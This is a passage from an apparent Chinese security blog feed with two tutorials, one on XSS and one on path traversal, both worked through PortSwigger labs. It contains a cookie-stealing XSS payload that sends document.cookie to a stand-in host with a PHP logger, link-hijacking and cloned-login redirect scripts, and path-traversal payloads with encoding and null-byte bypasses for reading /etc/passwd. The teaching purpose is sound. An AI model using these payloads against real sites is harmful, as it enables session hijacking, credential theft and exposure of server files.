title="举个栗子"></a>举个栗子</h3><p>以 PortSwigger XSS 实验中的 <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink">lab</a> 为例：</p><p>用户在搜索栏输入数据，web 应用使用 javascript 代码动态修改页面。</p><p>根据题目要求，<code>ctrl+shift+f</code> 全局搜索 <code>location.search</code>。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231123135504.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231123135504.png"></a></p><p>函数 <code>trackSearch()</code> 使用 <code>document.write</code> 在上下两个 section 中写入一个 <code>&lt;img&gt;</code> 标签。<code>location.search</code> 从 url <code>https://0ae0002203c0668a84176d2100500026.web-security-academy.net/?search=1655452184</code>中拿到参数 <code>search</code> 的值并赋值给 <code>query</code>。   GET 方法</p><p><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231123135020.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231123135020.png"></a></p><p>如果用户输入如下恶意 js 代码： <code>&quot;&gt; &lt;script&gt;alert(/xss/)&lt;/script&gt; &quot;&lt;</code>。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231128215413.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231128215413.png"></a></p><p>用户输入的数据被嵌入当作 html 标签嵌入页面中，恶意代码被执行，触发 xss。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231123135946.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231123135946.png"></a></p><h1 id="4-XSS-危害"><a href="#4-XSS-危害" class="headerlink" title="4 XSS 危害"></a>4 XSS 危害</h1><h2 id="4-1-盗取-cookie，劫持会话"><a href="#4-1-盗取-cookie，劫持会话" class="headerlink" title="4.1 盗取 cookie，劫持会话"></a>4.1 盗取 cookie，劫持会话</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?uname=&lt;script&gt;document.location=&quot;http://ip/cookie.php?cookie=&quot; + document.cookie&lt;/script&gt; #</span><br></pre></td></tr></table></figure><p>exploit server 的 cookie.php 代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;cookie.txt&#x27;</span>, <span class="variable">$cookie</span>);</span><br></pre></td></tr></table></figure><h2 id="4-2-篡改网页链接"><a href="#4-2-篡改网页链接" class="headerlink" title="4.2 篡改网页链接"></a>4.2 篡改网页链接</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> link = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;a&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; link.<span class="property">length</span>; j++)&#123;</span></span><br><span class="line"><span class="language-javascript">            link[j].<span class="property">href</span> = <span class="string">&quot;http://attacker-site.com/&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="4-3-盗取用户信息"><a href="#4-3-盗取用户信息" class="headerlink" title="4.3 盗取用户信息"></a>4.3 盗取用户信息</h2><p>思路：<strong>克隆网站登录页面</strong>，利用存储XSS设置跳转代码，如果用户访问，即跳转到克隆网站的登录页面，用户输入登录，账号密码被存储。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>=<span class="string">&quot;克隆网站ip&quot;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>如何克隆网站？<br><strong>答：</strong> kali setookit！</p></blockquote><h1 id="5-XSS-测试与发现"><a href="#5-XSS-测试与发现" class="headerlink" title="5 XSS 测试与发现"></a>5 XSS 测试与发现</h1><h2 id="5-1-自动化工具"><a href="#5-1-自动化工具" class="headerlink" title="5.1 自动化工具"></a>5.1 自动化工具</h2><ol><li>Burp Suite scanner</li><li><a href="https://github.com/s0md3v/XSStrike">XSStrike</a></li></ol><h2 id="5-2-手动探测"><a href="#5-2-手动探测" class="headerlink" title="5.2 手动探测"></a>5.2 手动探测</h2><ol><li>构造一个独一无二且不会被识别为恶意代码的字符串用来提交到页面</li><li>使用浏览器审查工具进行代码审查，寻找构造的字符串是否在页面中显示，如何显示，构造的字符串在相应标签中的位置（属性还是标签内容）。</li></ol><p>主要是明确数据流以及网站处理数据的方式。</p><h1 id="6-XSS-防御"><a href="#6-XSS-防御" class="headerlink" title="6 XSS 防御"></a>6 XSS 防御</h1><p>不好意思，现在不太 care 防御手段（傲娇</p>]]></content:encoded>
      
      
      
      <category domain="https://by-musi.github.io/tags/web/">web</category>
      
      <category domain="https://by-musi.github.io/tags/owaspTop10/">owaspTop10</category>
      
      <category domain="https://by-musi.github.io/tags/xss/">xss</category>
      
      
      <comments>https://by-musi.github.io/2023/12/20/XSS%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>路径穿越基础介绍</title>
      <link>https://by-musi.github.io/2023/12/17/%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/</link>
      <guid>https://by-musi.github.io/2023/12/17/%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/</guid>
      <pubDate>Sat, 16 Dec 2023 16:00:00 GMT</pubDate>
      
        
        
          
          
      <description></description>
          
        
      
      
      
      <content:encoded><![CDATA[<blockquote><p>你的 web 服务器不过是我的文件管理器罢了 :-\</p></blockquote><h1 id="1-什么是路径穿越"><a href="#1-什么是路径穿越" class="headerlink" title="1 什么是路径穿越"></a>1 什么是路径穿越</h1><p>路径穿越，path-traversal，也称为路径遍历、目录穿越&#x2F;遍历（directory traversal），是一种能让攻击者通过使用一些类似 <code>../</code> 的<strong>目录控制序列</strong>访问 web 服务器上<strong>任意文件</strong>的安全漏洞。</p><p>任意文件主要包括：</p><ul><li>程序源码和数据</li><li>服务端证书</li><li>敏感的系统文件，<code>/etc/passwd</code></li></ul><p>path-traversal 被 OWASP 收录的 Broken Access Control（BAC，越权访问）一栏，BAC 可是 <a href="https://owasp.org/www-project-top-ten/">OWASP Top 10</a> 2021 版中的 No.1 哦。</p><h1 id="2-测试方法"><a href="#2-测试方法" class="headerlink" title="2 测试方法"></a>2 测试方法</h1><p>寻找路径穿越漏洞分两步：</p><ol><li>输入向量枚举，定位注入点。</li><li>测试，绕过</li></ol><h2 id="2-1-不同OS的敏感文件位置"><a href="#2-1-不同OS的敏感文件位置" class="headerlink" title="2.1 不同OS的敏感文件位置"></a>2.1 不同OS的敏感文件位置</h2><p>需要了解 <strong>web app 服务端的架构、操作系统及其文件管理方式</strong>，就算存在路径穿越但你不知道你想要的文件放哪就尴尬了。</p><ul><li>Unix-like OS:<ul><li>root directory: <code>/</code></li><li>directory separator: <code>/</code></li><li>网站根目录：<code>/var/www/</code>, <code>/var/www/images/</code></li><li>常用 payload: <code>../../../etc/passwd</code></li></ul></li><li>Windows OS:<ul><li>root directory: <code>&lt;drive letter&gt;:</code></li><li>directory separator: <code>\</code> or <code>/</code></li></ul></li></ul><h2 id="2-2-举个栗子"><a href="#2-2-举个栗子" class="headerlink" title="2.2 举个栗子"></a>2.2 举个栗子</h2><p>以 PortSwigger Labs 中的一个简单<a href="https://portswigger.net/web-security/file-path-traversal/lab-simple">例子</a>进行说明：</p><p>开启 burp 再打开一个页面。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/17/Pasted-image-20231209110748.png" data-caption=""><img src="/images/2023/12/17/Pasted-image-20231209110748.png"></a></p><p>观察 HTTP history，找到一个 GET 图片文件的请求，这里可能存在路径穿越。（一堆 google 自动发的包，裂开</p><p>这里能直接看到一个访问请求，我就不枚举用户输入向量了，一般情况要要测试用户所有可能的输入向量，包括 GET 和 POST 等请求。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/17/Pasted-image-20231209110859.png" data-caption=""><img src="/images/2023/12/17/Pasted-image-20231209110859.png"></a></p><p>网页源码里面也能看到。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/17/Pasted-image-20231209111405.png" data-caption=""><img src="/images/2023/12/17/Pasted-image-20231209111405.png"></a></p><p>发送到 Repeater 重放，测试。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/17/Pasted-image-20231206224112.png" data-caption=""><img src="/images/2023/12/17/Pasted-image-20231206224112.png"></a></p><p>得到的响应报文如下，可以看到已经拿到了 <code>/etc/passwd</code> 的内容了。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/17/Pasted-image-20231207222507.png" data-caption=""><img src="/images/2023/12/17/Pasted-image-20231207222507.png"></a></p><h1 id="3-常规防御与绕过"><a href="#3-常规防御与绕过" class="headerlink" title="3 常规防御与绕过"></a>3 常规防御与绕过</h1><h2 id="3-1-使用绝对路径"><a href="#3-1-使用绝对路径" class="headerlink" title="3.1 使用绝对路径"></a>3.1 使用绝对路径</h2><p>删掉所有目录遍历序列，如 <code>../</code> 等 <a href="https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass">no case, no learning</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=/etc/passwd</span><br></pre></td></tr></table></figure><h2 id="3-2-双写绕过"><a href="#3-2-双写绕过" class="headerlink" title="3.2 双写绕过"></a>3.2 双写绕过</h2><p>仅将 <code>../</code> 替换为空，未对替换处理后的 filename 进行二次检查(non-recursively) <a href="https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively">no case, no learning</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=....//..././..././etc/passwd</span><br></pre></td></tr></table></figure><h2 id="3-3-编码绕过"><a href="#3-3-编码绕过" class="headerlink" title="3.3 编码绕过"></a>3.3 编码绕过</h2><p>先放一个好用的编码工具：<a href="https://gchq.github.io/CyberChef/">CyberChef</a>。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/17/Pasted-image-20231209113640.png" data-caption=""><img src="/images/2023/12/17/Pasted-image-20231209113640.png"></a></p><h3 id="3-3-1-URL-编码-与-double-URL-编码"><a href="#3-3-1-URL-编码-与-double-URL-编码" class="headerlink" title="3.3.1 URL 编码 与 double URL 编码"></a>3.3.1 URL 编码 与 double URL 编码</h3><p><code>../</code> 和 <code>..\</code> 各个部分url 编码的排列组合，我简单列几个。</p><ul><li>%2E%2E%2F –&gt; ..&#x2F;</li><li>%2E%2E&#x2F; –&gt; ..&#x2F;</li><li>..%2F –&gt; ..&#x2F;</li><li>%252E%252E%252F</li><li>..%5C –&gt; ..\</li><li>%2E%2E%5C –&gt; ..\</li><li>%252E%252E%255C –&gt; ..\</li></ul><h3 id="3-3-2-unicode-编码"><a href="#3-3-2-unicode-编码" class="headerlink" title="3.3.2 unicode 编码"></a>3.3.2 unicode 编码</h3><p><a data-fancybox="gallery" data-src="/images/2023/12/17/Pasted-image-20231209122622.png" data-caption=""><img src="/images/2023/12/17/Pasted-image-20231209122622.png"></a></p><ul><li>\u002E\u002E\u002F –&gt; ..&#x2F;</li><li>\u002E\u002E\u005C –&gt; ..\</li></ul><h3 id="3-3-3-其他非标准编码"><a href="#3-3-3-其他非标准编码" class="headerlink" title="3.3.3 其他非标准编码"></a>3.3.3 其他非标准编码</h3><ul><li>..%c0%af</li><li>..%ef%bc%8f</li></ul><h2 id="3-4-其他绕过方式"><a href="#3-4-其他绕过方式" class="headerlink" title="3.4 其他绕过方式"></a>3.4 其他绕过方式</h2><h3 id="3-4-1-00-截断"><a href="#3-4-1-00-截断" class="headerlink" title="3.4.1 %00 截断"></a>3.4.1 %00 截断</h3><p>某些情况下 web app 会验证文件的扩展名，如必须以 <code>.png</code> 结尾等。如果简单构造 <code>filename=../../../etc/passwd.png</code> 显然无法拿到我们想要的文件。</p><p>而截断机制既能绕过输入有效性验证，又能在解析文件时拿到我们想要的文件。 <a href="https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass">no case, no learning</a></p><p>%00 截断：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=../../../etc/passwd%00.jpg</span><br></pre></td></tr></table></figure><p>#todo</p><ul><li><input disabled="" type="checkbox"> 调研其他截断机制？</li></ul><h3 id="3-4-2-必须包含某些路径"><a href="#3-4-2-必须包含某些路径" class="headerlink" title="3.4.2 必须包含某些路径"></a>3.4.2 必须包含某些路径</h3><p>有些 web app 要求文件名中必须包含某些特定的目录 (base folder)，这时我们仍可以使用 <code>../</code> 拿到我们想要的内容。<a href="https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path">no case, no learning</a> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=/var/www/images/../../../etc/passwd</span><br></pre></td></tr></table></figure><p>#todo </p><ul><li><input disabled="" type="checkbox"> 汇总常见 Payload</li></ul><h1 id="4-防御手段"><a href="#4-防御手段" class="headerlink" title="4 防御手段"></a>4 防御手段</h1><p>最有效的防御方法就是<strong>缩小攻击面</strong>，典型的例子：中国防火墙 Great Firewall。对于路径穿越的防御也同样适用，避免用户与 filesystem APIs 交互能有效减少路径穿越攻击的风险。</p><p>但大部分情况下无法避免用户提供的输入与 filesystem APIs 交互，防御方法如下：</p><ol><li>使用<strong>白名单</strong>对<strong>用户输入</strong>进行验证与过滤</li><li>使用当前操作系统路径规范化函数规范化路径后，进行过滤，最后再进行相关调用</li></ol><h1 id="5-工具"><a href="#5-工具" class="headerlink" title="5 工具"></a>5 工具</h1><p>说实话感觉这玩意手动测试的话也太麻烦了。</p><p>一些常用的工具:</p><ul><li>BurpSuite Intruder 可用这些 <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal/Intruder">字典</a> 对其进行配置</li><li><a href="https://github.com/wireghoul/dotdotpwn">DotDotPwn</a> 好久不更新了呀</li><li><a href="https://www.zaproxy.org/">OWASP ZAP</a></li><li><a href="https://github.com/xmendez/wfuzz">wfuzz</a></li></ul><p>常回来看看：</p><ul><li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">PayloadsAllTheThings</a></li></ul><h1 id="6-参考链接"><a href="#6-参考链接" class="headerlink" title="6 参考链接"></a>6 参考链接</h1><ul><li><a href="https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include.md">OWASP wstg path-traversal</a></li><li><a href="https://portswigger.net/web-security/file-path-traversal">path-traversal by PortSwigger</a></li><li><a href="https://websec.readthedocs.io/zh/latest/vuln/pathtraversal.html">目录穿越</a></li><li><a href="https://code.google.com/archive/p/teenage-mutant-ninja-turtles/wikis/AdvancedObfuscationPathtraversal.wiki">Advanced Directory Traversal filter bypassing</a></li><li><a href="https://blog.csdn.net/qingzhantianxia/article/details/128204437">路径穿越（Path Traversal）详解</a></li></ul>]]></content:encoded>
      
      
      
      <category domain="https://by-musi.github.io/tags/web/">web</category>
      
      <category domain="https://by-musi.github.io/tags/owaspTop10/">owaspTop10</category>
      
      <category domain="https://by-musi.github.io/tags/path-traversal/">path-traversal</category>
      
      
      <comments>https://by-musi.github.io/2023/12/17/%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
